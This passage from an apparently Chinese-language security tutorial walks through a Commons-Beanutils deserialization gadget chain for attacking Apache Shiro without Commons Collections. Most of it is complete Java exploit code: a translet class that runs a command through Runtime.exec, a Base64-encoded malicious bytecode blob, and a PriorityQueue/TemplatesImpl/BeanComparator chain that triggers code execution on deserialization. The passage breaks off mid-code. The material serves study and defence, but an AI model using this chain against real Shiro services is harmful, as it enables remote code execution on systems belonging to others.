<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0b49927ef99643d298241d7a989fc489.png" alt="image-20220629110957407"></p>
<blockquote>
<p>Shiro不是遇到Tomcat就一定会有数组这个问题 </p>
<p>Shiro-550的修复并不意味着反序列化漏洞的修复，只是默认Key被移除了 </p>
<p>网上大部分的文章上来就是装一个commons-collections4.0，这个是没有代表性的，不建议将这二 者结合起来学习</p>
</blockquote>
<h4 id="无CC攻击shiro"><a href="#无CC攻击shiro" class="headerlink" title="无CC攻击shiro"></a>无CC攻击shiro</h4><h5 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总的来说只存在<code>setter</code>和<code>getter</code>方法的类称为<code>JavaBean</code></p>
<h5 id="Apache-Commons-Beanutils"><a href="#Apache-Commons-Beanutils" class="headerlink" title="Apache Commons Beanutils"></a>Apache Commons Beanutils</h5><p>测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;Ameuu&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> Test(), <span class="string">&quot;name&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提供了静态方法<code>PropertyUtils.getProperty()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getNestedProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用到<code>PropertyUtilsBean#getNestedProperty</code>，因为测试类只有一个属性所以会直接到最后一个else，调用到<code>getSimpleProperty</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getNestedProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bean == <span class="keyword">null</span>) &#123;</span><br><span class="line">       ……</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">this</span>.resolver.hasNested(name)) &#123;</span><br><span class="line">            ……</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">           ……</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bean = <span class="keyword">this</span>.getSimpleProperty(bean, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getSimpleProperty</code>会在最后获取关于这个类的属性的描述，再调用相应的getter获取属性值，实现不直接用<code>getter</code>获取到属性的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getSimpleProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bean == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ……</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> DynaBean) &#123;</span><br><span class="line">        ……</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        PropertyDescriptor descriptor = <span class="keyword">this</span>.getPropertyDescriptor(bean, name);</span><br><span class="line">        <span class="keyword">if</span> (descriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(<span class="string">&quot;Unknown property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Method readMethod = <span class="keyword">this</span>.getReadMethod(bean.getClass(), descriptor);</span><br><span class="line">            <span class="keyword">if</span> (readMethod == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(<span class="string">&quot;Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Object value = <span class="keyword">this</span>.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8168b835365e4324851977056958a1dd.png" alt="image-20220629145746755"></p>
<p>执行<code>getName(getter)</code>获取内容</p>
<p><img src="https://img-blog.csdnimg.cn/1b280455a9954442aa522f0c79fc7f17.png" alt="image-20220629145916030"></p>
<h5 id="利用getter"><a href="#利用getter" class="headerlink" title="利用getter"></a>利用getter</h5><p>本次链子还是需要用到<code>TemplatesImpl</code>，那么现在就是要找到该怎么触发到``TemplatesImpl#newTransformer`从而实现RCE</p>
<p>就比如前面运用过的<code>TrAXFilter</code>，然后也不要忘了一开始在分析<code>TemplatesImpl</code>链子的时候它自身的<code>getOutputProperties</code>其实就会调用到<code>newTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再结合前面所学的<code>PropertyUtils.getProperty()</code>，那么就可以实现调用到<code>getOutputProperties</code>方法</p>
<p>这里用到的是<code>org.apache.commons.beanutils.BeanComparator</code>，而他的compare方法就调用到了<code> PropertyUtils.getProperty</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object o1, Object o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.property == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, <span class="keyword">this</span>.property);</span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, <span class="keyword">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="构造链子"><a href="#构造链子" class="headerlink" title="构造链子"></a>构造链子</h5><p>Exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译生成字节码</p>
<p><img src="https://img-blog.csdnimg.cn/edcf9c44853a415e83fc9c20b10bfa3a.png" alt="image-20220629162937904"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.messaging.saaj.util.ByteInputStream;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CBShiroTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 命令 这里用了javassist进行命令执行</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());</span><br><span class="line">        <span class="comment">// 不用javassist</span></span><br><span class="line">         <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABpjb20vZ292dWxuL3NoaXJvYXR0YWNrL0V4cAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAMAAEADgAPAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAFAAEABUADQAWAAsAAAAEAAEAEAABABEAAAACABI=&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;clazz.toBytecode()&#125;);</span><br><span class="line">        <span class="comment">// setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        <span class="comment">// 防止初始化报错</span></span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将property变为outputProperties 从而可以在BeanComparator#compare能够调用到TemplatesImpl#getOutputProperties</span></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do serialize</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(byteArrayOutputStream.toByteArray());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        Object o = (Object) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射进行赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>相比于ysoserial里的CommonsBeanutils1利用链，本文的利用链去掉了对 java.math.BigInteger 的 使用，因为ysoserial为了兼容 property=lowestSetBit ，但实际上我们将 property 设置为null即可。</p>
</blockquote>
<h5 id="无CC依赖链子"><a href="#无CC依赖链子" class="headerlink" title="无CC依赖链子"></a>无CC依赖链子</h5><p>把CC依赖给删掉之后，计算器弹不出来了，而存在报错</p>
<p>因为<code>BeanComparator</code>类中如果不给赋值的话，<code>this.comparator</code>会被初始化为<code>org.apache.commons.collections.comparators.ComparableComparator</code>，而这个类又是CC中的，所以就不能执行成功了</p>
<p><img src="https://img-blog.csdnimg.cn/790d93cde7e7419599b7a0b9483cee1c.png" alt="image-20220629164939858"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.comparators.ComparableComparator;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/fdbf6cf496104ff6a3c8d2ebb050bb55.png" alt="image-20220629165135130"></p>
<p>所以要找到对应的类去代替<code>org.apache.commons.collections.comparators.ComparableComparator</code></p>
<blockquote>
<p>满足的条件：</p>
<ul>
<li>实现 java.util.Comparator 接口 </li>
<li>实现 java.io.Serializable 接口 </li>
<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
</ul>
</blockquote>
<p><code>CaseInsensitiveComparator</code>该类是String的内部类。并且<code>String.CASE_INSENSITIVE_ORDER</code>就实现实例化这个类，所以我们只要传入<code>String.CASE_INSENSITIVE_ORDER</code>就好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER</span><br><span class="line">                                     = <span class="keyword">new</span> CaseInsensitiveComparator();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CaseInsensitiveComparator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">String</span>&gt;, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8575799808933029326L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">        ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Replaces the de-serialized object. */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> CASE_INSENSITIVE_ORDER; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CBTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwADgAPBwAcDAAdAB4BAARjYWxjDAAfACABABpjb20vZ292dWxuL3NoaXJvYXR0YWNrL0V4cAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAMAAEADgAPAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAFAAEABUADQAWAAsAAAAEAAEAEAABABEAAAACABI=&quot;</span>);</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do serialize</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(byteArrayOutputStream.toByteArray());</span></span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        Object o = (Object) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射进行赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span> <span class="keyword">throws</span> 